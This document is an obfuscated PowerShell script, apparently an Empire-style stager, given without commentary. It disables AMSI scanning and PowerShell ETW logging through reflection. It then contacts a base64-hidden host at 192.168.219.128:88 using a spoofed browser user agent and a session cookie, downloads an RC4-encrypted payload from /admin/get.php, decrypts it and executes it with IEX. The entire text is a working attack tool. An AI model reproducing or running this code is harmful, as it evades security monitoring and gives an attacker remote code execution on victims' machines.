IF($PSVErSIoNTaBLE.PSVeRSION.MajOr -Ge 3){
    $ReF=[ReF].AsSemBlY.GEtTypE('System.Management.Automation.Amsi'+'Utils');
    $Ref.GetFIElD('amsiInitF'+'ailed','NonPublic,Static').SETValue($NULl,$truE);
    [System.Diagnostics.Eventing.EventProvider]."GetFie`ld"('m_e'+'nabled','Non'+'Public,'+'Instance').SetValue([Ref].Assembly.GetType('Syste'+'m.Management.Automation.Tracing.PSE'+'twLogProvider')."GetFie`ld"('et'+'wProvider','NonPub'+'lic,S'+'tatic').GetValue($null),0);
    };
[SYsTeM.NEt.SErVICePOintMaNageR]::ExPeCT100CoNtiNue=0;
$7A6Ed=NEw-OBjeCT SYSTEM.NEt.WEBCliENT;
$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';
$ser=$([TExt.ENCoDINg]::UniCOdE.GETSTrINg([CoNVErt]::FroMBASe64STrIng('aAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMgAxADkALgAxADIAOAA6ADgAOAA=')));
$t='/admin/get.php';
$7a6eD.HEADERs.ADD('User-Agent',$u);
$7a6eD.Proxy=[SySTem.NET.WeBREQuest]::DefauLtWebPRoXy;
$7a6ed.PrOxY.CreDEntIALs = [SYsteM.NeT.CredEnTIAlCAcHe]::DEFAuLTNEtworkCreDEntIaLs;
$Script:Proxy = $7a6ed.Proxy;
$K=[SySteM.TeXt.EncOdiNG]::ASCII.GeTBYTes('uDRl{aN40:X;}Spr@_)gACi^/2UMxLb=');
$R={$D,$K=$ARGs;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-BXor$S[($S[$I]+$S[$H])%256]}};
$7A6eD.HEADerS.Add("Cookie","uvIVBBJCOFNO=QlYX02BEzDfZQ6Y1zq/EveTtpOY=");
$DAta=$7a6eD.DOWNLOADDAtA($sEr+$t);
$Iv=$dAta[0..3];$DATa=$DaTA[4..$DAta.LENGth];
-JOIn[CHAr[]](& $R $DaTa ($IV+$K))|IEX
